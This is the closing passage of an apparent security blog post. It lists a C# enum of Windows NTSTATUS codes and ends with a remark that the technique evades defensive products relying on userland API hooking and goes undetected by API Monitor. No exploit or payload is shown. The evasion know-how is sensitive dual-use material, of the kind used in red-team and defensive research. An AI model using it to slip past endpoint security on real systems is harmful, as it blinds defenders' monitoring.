            InvalidCid = <span style="color:#ae81ff">0</span>xc000000b,
            TimerNotCanceled = <span style="color:#ae81ff">0</span>xc000000c,
            InvalidParameter = <span style="color:#ae81ff">0</span>xc000000d,
            NoSuchDevice = <span style="color:#ae81ff">0</span>xc000000e,
            NoSuchFile = <span style="color:#ae81ff">0</span>xc000000f,
            InvalidDeviceRequest = <span style="color:#ae81ff">0</span>xc0000010,
            EndOfFile = <span style="color:#ae81ff">0</span>xc0000011,
            WrongVolume = <span style="color:#ae81ff">0</span>xc0000012,
            NoMediaInDevice = <span style="color:#ae81ff">0</span>xc0000013,
            NoMemory = <span style="color:#ae81ff">0</span>xc0000017,
            ConflictingAddresses = <span style="color:#ae81ff">0</span>xc0000018,
            NotMappedView = <span style="color:#ae81ff">0</span>xc0000019,
            UnableToFreeVm = <span style="color:#ae81ff">0</span>xc000001a,
            UnableToDeleteSection = <span style="color:#ae81ff">0</span>xc000001b,
            IllegalInstruction = <span style="color:#ae81ff">0</span>xc000001d,
            AlreadyCommitted = <span style="color:#ae81ff">0</span>xc0000021,
            AccessDenied = <span style="color:#ae81ff">0</span>xc0000022,
            BufferTooSmall = <span style="color:#ae81ff">0</span>xc0000023,
            ObjectTypeMismatch = <span style="color:#ae81ff">0</span>xc0000024,
            NonContinuableException = <span style="color:#ae81ff">0</span>xc0000025,
            BadStack = <span style="color:#ae81ff">0</span>xc0000028,
            NotLocked = <span style="color:#ae81ff">0</span>xc000002a,
            NotCommitted = <span style="color:#ae81ff">0</span>xc000002d,
            InvalidParameterMix = <span style="color:#ae81ff">0</span>xc0000030,
            ObjectNameInvalid = <span style="color:#ae81ff">0</span>xc0000033,
            ObjectNameNotFound = <span style="color:#ae81ff">0</span>xc0000034,
            ObjectNameCollision = <span style="color:#ae81ff">0</span>xc0000035,
            ObjectPathInvalid = <span style="color:#ae81ff">0</span>xc0000039,
            ObjectPathNotFound = <span style="color:#ae81ff">0</span>xc000003a,
            ObjectPathSyntaxBad = <span style="color:#ae81ff">0</span>xc000003b,
            DataOverrun = <span style="color:#ae81ff">0</span>xc000003c,
            DataLate = <span style="color:#ae81ff">0</span>xc000003d,
            DataError = <span style="color:#ae81ff">0</span>xc000003e,
            CrcError = <span style="color:#ae81ff">0</span>xc000003f,
            SectionTooBig = <span style="color:#ae81ff">0</span>xc0000040,
            PortConnectionRefused = <span style="color:#ae81ff">0</span>xc0000041,
            InvalidPortHandle = <span style="color:#ae81ff">0</span>xc0000042,
            SharingViolation = <span style="color:#ae81ff">0</span>xc0000043,
            QuotaExceeded = <span style="color:#ae81ff">0</span>xc0000044,
            InvalidPageProtection = <span style="color:#ae81ff">0</span>xc0000045,
            MutantNotOwned = <span style="color:#ae81ff">0</span>xc0000046,
            SemaphoreLimitExceeded = <span style="color:#ae81ff">0</span>xc0000047,
            PortAlreadySet = <span style="color:#ae81ff">0</span>xc0000048,
            SectionNotImage = <span style="color:#ae81ff">0</span>xc0000049,
            SuspendCountExceeded = <span style="color:#ae81ff">0</span>xc000004a,
            ThreadIsTerminating = <span style="color:#ae81ff">0</span>xc000004b,
            BadWorkingSetLimit = <span style="color:#ae81ff">0</span>xc000004c,
            IncompatibleFileMap = <span style="color:#ae81ff">0</span>xc000004d,
            SectionProtection = <span style="color:#ae81ff">0</span>xc000004e,
            EasNotSupported = <span style="color:#ae81ff">0</span>xc000004f,
            EaTooLarge = <span style="color:#ae81ff">0</span>xc0000050,
            NonExistentEaEntry = <span style="color:#ae81ff">0</span>xc0000051,
            NoEasOnFile = <span style="color:#ae81ff">0</span>xc0000052,
            EaCorruptError = <span style="color:#ae81ff">0</span>xc0000053,
            FileLockConflict = <span style="color:#ae81ff">0</span>xc0000054,
            LockNotGranted = <span style="color:#ae81ff">0</span>xc0000055,
            DeletePending = <span style="color:#ae81ff">0</span>xc0000056,
            CtlFileNotSupported = <span style="color:#ae81ff">0</span>xc0000057,
            UnknownRevision = <span style="color:#ae81ff">0</span>xc0000058,
            RevisionMismatch = <span style="color:#ae81ff">0</span>xc0000059,
            InvalidOwner = <span style="color:#ae81ff">0</span>xc000005a,
            InvalidPrimaryGroup = <span style="color:#ae81ff">0</span>xc000005b,
            NoImpersonationToken = <span style="color:#ae81ff">0</span>xc000005c,
            CantDisableMandatory = <span style="color:#ae81ff">0</span>xc000005d,
            NoLogonServers = <span style="color:#ae81ff">0</span>xc000005e,
            NoSuchLogonSession = <span style="color:#ae81ff">0</span>xc000005f,
            NoSuchPrivilege = <span style="color:#ae81ff">0</span>xc0000060,
            PrivilegeNotHeld = <span style="color:#ae81ff">0</span>xc0000061,
            InvalidAccountName = <span style="color:#ae81ff">0</span>xc0000062,
            UserExists = <span style="color:#ae81ff">0</span>xc0000063,
            NoSuchUser = <span style="color:#ae81ff">0</span>xc0000064,
            GroupExists = <span style="color:#ae81ff">0</span>xc0000065,
            NoSuchGroup = <span style="color:#ae81ff">0</span>xc0000066,
            MemberInGroup = <span style="color:#ae81ff">0</span>xc0000067,
            MemberNotInGroup = <span style="color:#ae81ff">0</span>xc0000068,
            LastAdmin = <span style="color:#ae81ff">0</span>xc0000069,
            WrongPassword = <span style="color:#ae81ff">0</span>xc000006a,
            IllFormedPassword = <span style="color:#ae81ff">0</span>xc000006b,
            PasswordRestriction = <span style="color:#ae81ff">0</span>xc000006c,
            LogonFailure = <span style="color:#ae81ff">0</span>xc000006d,
            AccountRestriction = <span style="color:#ae81ff">0</span>xc000006e,
            InvalidLogonHours = <span style="color:#ae81ff">0</span>xc000006f,
            InvalidWorkstation = <span style="color:#ae81ff">0</span>xc0000070,
            PasswordExpired = <span style="color:#ae81ff">0</span>xc0000071,
            AccountDisabled = <span style="color:#ae81ff">0</span>xc0000072,
            NoneMapped = <span style="color:#ae81ff">0</span>xc0000073,
            TooManyLuidsRequested = <span style="color:#ae81ff">0</span>xc0000074,
            LuidsExhausted = <span style="color:#ae81ff">0</span>xc0000075,
            InvalidSubAuthority = <span style="color:#ae81ff">0</span>xc0000076,
            InvalidAcl = <span style="color:#ae81ff">0</span>xc0000077,
            InvalidSid = <span style="color:#ae81ff">0</span>xc0000078,
            InvalidSecurityDescr = <span style="color:#ae81ff">0</span>xc0000079,
            ProcedureNotFound = <span style="color:#ae81ff">0</span>xc000007a,
            InvalidImageFormat = <span style="color:#ae81ff">0</span>xc000007b,
            NoToken = <span style="color:#ae81ff">0</span>xc000007c,
            BadInheritanceAcl = <span style="color:#ae81ff">0</span>xc000007d,
            RangeNotLocked = <span style="color:#ae81ff">0</span>xc000007e,
            DiskFull = <span style="color:#ae81ff">0</span>xc000007f,
            ServerDisabled = <span style="color:#ae81ff">0</span>xc0000080,
            ServerNotDisabled = <span style="color:#ae81ff">0</span>xc0000081,
            TooManyGuidsRequested = <span style="color:#ae81ff">0</span>xc0000082,
            GuidsExhausted = <span style="color:#ae81ff">0</span>xc0000083,
            InvalidIdAuthority = <span style="color:#ae81ff">0</span>xc0000084,
            AgentsExhausted = <span style="color:#ae81ff">0</span>xc0000085,
            InvalidVolumeLabel = <span style="color:#ae81ff">0</span>xc0000086,
            SectionNotExtended = <span style="color:#ae81ff">0</span>xc0000087,
            NotMappedData = <span style="color:#ae81ff">0</span>xc0000088,
            ResourceDataNotFound = <span style="color:#ae81ff">0</span>xc0000089,
            ResourceTypeNotFound = <span style="color:#ae81ff">0</span>xc000008a,
            ResourceNameNotFound = <span style="color:#ae81ff">0</span>xc000008b,
            ArrayBoundsExceeded = <span style="color:#ae81ff">0</span>xc000008c,
            FloatDenormalOperand = <span style="color:#ae81ff">0</span>xc000008d,
            FloatDivideByZero = <span style="color:#ae81ff">0</span>xc000008e,
            FloatInexactResult = <span style="color:#ae81ff">0</span>xc000008f,
            FloatInvalidOperation = <span style="color:#ae81ff">0</span>xc0000090,
            FloatOverflow = <span style="color:#ae81ff">0</span>xc0000091,
            FloatStackCheck = <span style="color:#ae81ff">0</span>xc0000092,
            FloatUnderflow = <span style="color:#ae81ff">0</span>xc0000093,
            IntegerDivideByZero = <span style="color:#ae81ff">0</span>xc0000094,
            IntegerOverflow = <span style="color:#ae81ff">0</span>xc0000095,
            PrivilegedInstruction = <span style="color:#ae81ff">0</span>xc0000096,
            TooManyPagingFiles = <span style="color:#ae81ff">0</span>xc0000097,
            FileInvalid = <span style="color:#ae81ff">0</span>xc0000098,
            InsufficientResources = <span style="color:#ae81ff">0</span>xc000009a,
            InstanceNotAvailable = <span style="color:#ae81ff">0</span>xc00000ab,
            PipeNotAvailable = <span style="color:#ae81ff">0</span>xc00000ac,
            InvalidPipeState = <span style="color:#ae81ff">0</span>xc00000ad,
            PipeBusy = <span style="color:#ae81ff">0</span>xc00000ae,
            IllegalFunction = <span style="color:#ae81ff">0</span>xc00000af,
            PipeDisconnected = <span style="color:#ae81ff">0</span>xc00000b0,
            PipeClosing = <span style="color:#ae81ff">0</span>xc00000b1,
            PipeConnected = <span style="color:#ae81ff">0</span>xc00000b2,
            PipeListening = <span style="color:#ae81ff">0</span>xc00000b3,
            InvalidReadMode = <span style="color:#ae81ff">0</span>xc00000b4,
            IoTimeout = <span style="color:#ae81ff">0</span>xc00000b5,
            FileForcedClosed = <span style="color:#ae81ff">0</span>xc00000b6,
            ProfilingNotStarted = <span style="color:#ae81ff">0</span>xc00000b7,
            ProfilingNotStopped = <span style="color:#ae81ff">0</span>xc00000b8,
            NotSameDevice = <span style="color:#ae81ff">0</span>xc00000d4,
            FileRenamed = <span style="color:#ae81ff">0</span>xc00000d5,
            CantWait = <span style="color:#ae81ff">0</span>xc00000d8,
            PipeEmpty = <span style="color:#ae81ff">0</span>xc00000d9,
            CantTerminateSelf = <span style="color:#ae81ff">0</span>xc00000db,
            InternalError = <span style="color:#ae81ff">0</span>xc00000e5,
            InvalidParameter1 = <span style="color:#ae81ff">0</span>xc00000ef,
            InvalidParameter2 = <span style="color:#ae81ff">0</span>xc00000f0,
            InvalidParameter3 = <span style="color:#ae81ff">0</span>xc00000f1,
            InvalidParameter4 = <span style="color:#ae81ff">0</span>xc00000f2,
            InvalidParameter5 = <span style="color:#ae81ff">0</span>xc00000f3,
            InvalidParameter6 = <span style="color:#ae81ff">0</span>xc00000f4,
            InvalidParameter7 = <span style="color:#ae81ff">0</span>xc00000f5,
            InvalidParameter8 = <span style="color:#ae81ff">0</span>xc00000f6,
            InvalidParameter9 = <span style="color:#ae81ff">0</span>xc00000f7,
            InvalidParameter10 = <span style="color:#ae81ff">0</span>xc00000f8,
            InvalidParameter11 = <span style="color:#ae81ff">0</span>xc00000f9,
            InvalidParameter12 = <span style="color:#ae81ff">0</span>xc00000fa,
            ProcessIsTerminating = <span style="color:#ae81ff">0</span>xc000010a,
            MappedFileSizeZero = <span style="color:#ae81ff">0</span>xc000011e,
            TooManyOpenedFiles = <span style="color:#ae81ff">0</span>xc000011f,
            Cancelled = <span style="color:#ae81ff">0</span>xc0000120,
            CannotDelete = <span style="color:#ae81ff">0</span>xc0000121,
            InvalidComputerName = <span style="color:#ae81ff">0</span>xc0000122,
            FileDeleted = <span style="color:#ae81ff">0</span>xc0000123,
            SpecialAccount = <span style="color:#ae81ff">0</span>xc0000124,
            SpecialGroup = <span style="color:#ae81ff">0</span>xc0000125,
            SpecialUser = <span style="color:#ae81ff">0</span>xc0000126,
            MembersPrimaryGroup = <span style="color:#ae81ff">0</span>xc0000127,
            FileClosed = <span style="color:#ae81ff">0</span>xc0000128,
            TooManyThreads = <span style="color:#ae81ff">0</span>xc0000129,
            ThreadNotInProcess = <span style="color:#ae81ff">0</span>xc000012a,
            TokenAlreadyInUse = <span style="color:#ae81ff">0</span>xc000012b,
            PagefileQuotaExceeded = <span style="color:#ae81ff">0</span>xc000012c,
            CommitmentLimit = <span style="color:#ae81ff">0</span>xc000012d,
            InvalidImageLeFormat = <span style="color:#ae81ff">0</span>xc000012e,
            InvalidImageNotMz = <span style="color:#ae81ff">0</span>xc000012f,
            InvalidImageProtect = <span style="color:#ae81ff">0</span>xc0000130,
            InvalidImageWin16 = <span style="color:#ae81ff">0</span>xc0000131,
            LogonServer = <span style="color:#ae81ff">0</span>xc0000132,
            DifferenceAtDc = <span style="color:#ae81ff">0</span>xc0000133,
            SynchronizationRequired = <span style="color:#ae81ff">0</span>xc0000134,
            DllNotFound = <span style="color:#ae81ff">0</span>xc0000135,
            IoPrivilegeFailed = <span style="color:#ae81ff">0</span>xc0000137,
            OrdinalNotFound = <span style="color:#ae81ff">0</span>xc0000138,
            EntryPointNotFound = <span style="color:#ae81ff">0</span>xc0000139,
            ControlCExit = <span style="color:#ae81ff">0</span>xc000013a,
            InvalidAddress = <span style="color:#ae81ff">0</span>xc0000141,
            PortNotSet = <span style="color:#ae81ff">0</span>xc0000353,
            DebuggerInactive = <span style="color:#ae81ff">0</span>xc0000354,
            CallbackBypass = <span style="color:#ae81ff">0</span>xc0000503,
            PortClosed = <span style="color:#ae81ff">0</span>xc0000700,
            MessageLost = <span style="color:#ae81ff">0</span>xc0000701,
            InvalidMessage = <span style="color:#ae81ff">0</span>xc0000702,
            RequestCanceled = <span style="color:#ae81ff">0</span>xc0000703,
            RecursiveDispatch = <span style="color:#ae81ff">0</span>xc0000704,
            LpcReceiveBufferExpected = <span style="color:#ae81ff">0</span>xc0000705,
            LpcInvalidConnectionUsage = <span style="color:#ae81ff">0</span>xc0000706,
            LpcRequestsNotAllowed = <span style="color:#ae81ff">0</span>xc0000707,
            ResourceInUse = <span style="color:#ae81ff">0</span>xc0000708,
            ProcessIsProtected = <span style="color:#ae81ff">0</span>xc0000712,
            VolumeDirty = <span style="color:#ae81ff">0</span>xc0000806,
            FileCheckedOut = <span style="color:#ae81ff">0</span>xc0000901,
            CheckOutRequired = <span style="color:#ae81ff">0</span>xc0000902,
            BadFileType = <span style="color:#ae81ff">0</span>xc0000903,
            FileTooLarge = <span style="color:#ae81ff">0</span>xc0000904,
            FormsAuthRequired = <span style="color:#ae81ff">0</span>xc0000905,
            VirusInfected = <span style="color:#ae81ff">0</span>xc0000906,
            VirusDeleted = <span style="color:#ae81ff">0</span>xc0000907,
            TransactionalConflict = <span style="color:#ae81ff">0</span>xc0190001,
            InvalidTransaction = <span style="color:#ae81ff">0</span>xc0190002,
            TransactionNotActive = <span style="color:#ae81ff">0</span>xc0190003,
            TmInitializationFailed = <span style="color:#ae81ff">0</span>xc0190004,
            RmNotActive = <span style="color:#ae81ff">0</span>xc0190005,
            RmMetadataCorrupt = <span style="color:#ae81ff">0</span>xc0190006,
            TransactionNotJoined = <span style="color:#ae81ff">0</span>xc0190007,
            DirectoryNotRm = <span style="color:#ae81ff">0</span>xc0190008,
            CouldNotResizeLog = <span style="color:#ae81ff">0</span>xc0190009,
            TransactionsUnsupportedRemote = <span style="color:#ae81ff">0</span>xc019000a,
            LogResizeInvalidSize = <span style="color:#ae81ff">0</span>xc019000b,
            RemoteFileVersionMismatch = <span style="color:#ae81ff">0</span>xc019000c,
            CrmProtocolAlreadyExists = <span style="color:#ae81ff">0</span>xc019000f,
            TransactionPropagationFailed = <span style="color:#ae81ff">0</span>xc0190010,
            CrmProtocolNotFound = <span style="color:#ae81ff">0</span>xc0190011,
            TransactionSuperiorExists = <span style="color:#ae81ff">0</span>xc0190012,
            TransactionRequestNotValid = <span style="color:#ae81ff">0</span>xc0190013,
            TransactionNotRequested = <span style="color:#ae81ff">0</span>xc0190014,
            TransactionAlreadyAborted = <span style="color:#ae81ff">0</span>xc0190015,
            TransactionAlreadyCommitted = <span style="color:#ae81ff">0</span>xc0190016,
            TransactionInvalidMarshallBuffer = <span style="color:#ae81ff">0</span>xc0190017,
            CurrentTransactionNotValid = <span style="color:#ae81ff">0</span>xc0190018,
            LogGrowthFailed = <span style="color:#ae81ff">0</span>xc0190019,
            ObjectNoLongerExists = <span style="color:#ae81ff">0</span>xc0190021,
            StreamMiniversionNotFound = <span style="color:#ae81ff">0</span>xc0190022,
            StreamMiniversionNotValid = <span style="color:#ae81ff">0</span>xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = <span style="color:#ae81ff">0</span>xc0190024,
            CantOpenMiniversionWithModifyIntent = <span style="color:#ae81ff">0</span>xc0190025,
            CantCreateMoreStreamMiniversions = <span style="color:#ae81ff">0</span>xc0190026,
            HandleNoLongerValid = <span style="color:#ae81ff">0</span>xc0190028,
            NoTxfMetadata = <span style="color:#ae81ff">0</span>xc0190029,
            LogCorruptionDetected = <span style="color:#ae81ff">0</span>xc0190030,
            CantRecoverWithHandleOpen = <span style="color:#ae81ff">0</span>xc0190031,
            RmDisconnected = <span style="color:#ae81ff">0</span>xc0190032,
            EnlistmentNotSuperior = <span style="color:#ae81ff">0</span>xc0190033,
            RecoveryNotNeeded = <span style="color:#ae81ff">0</span>xc0190034,
            RmAlreadyStarted = <span style="color:#ae81ff">0</span>xc0190035,
            FileIdentityNotPersistent = <span style="color:#ae81ff">0</span>xc0190036,
            CantBreakTransactionalDependency = <span style="color:#ae81ff">0</span>xc0190037,
            CantCrossRmBoundary = <span style="color:#ae81ff">0</span>xc0190038,
            TxfDirNotEmpty = <span style="color:#ae81ff">0</span>xc0190039,
            IndoubtTransactionsExist = <span style="color:#ae81ff">0</span>xc019003a,
            TmVolatile = <span style="color:#ae81ff">0</span>xc019003b,
            RollbackTimerExpired = <span style="color:#ae81ff">0</span>xc019003c,
            TxfAttributeCorrupt = <span style="color:#ae81ff">0</span>xc019003d,
            EfsNotAllowedInTransaction = <span style="color:#ae81ff">0</span>xc019003e,
            TransactionalOpenNotAllowed = <span style="color:#ae81ff">0</span>xc019003f,
            TransactedMappingUnsupportedRemote = <span style="color:#ae81ff">0</span>xc0190040,
            TxfMetadataAlreadyPresent = <span style="color:#ae81ff">0</span>xc0190041,
            TransactionScopeCallbacksNotSet = <span style="color:#ae81ff">0</span>xc0190042,
            TransactionRequiredPromotion = <span style="color:#ae81ff">0</span>xc0190043,
            CannotExecuteFileInTransaction = <span style="color:#ae81ff">0</span>xc0190044,
            TransactionsNotFrozen = <span style="color:#ae81ff">0</span>xc0190045,

            MaximumNtStatus = <span style="color:#ae81ff">0</span>xffffffff
        }
    }
}
</code></pre></div><p>This is definately not as straight forward as using P/Invoke, but it&rsquo;s a very effective means of evading defensive products that employ userland hooking.  API Monitor does not detect the use of these APIs - but feel free to verify that for yourself!</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
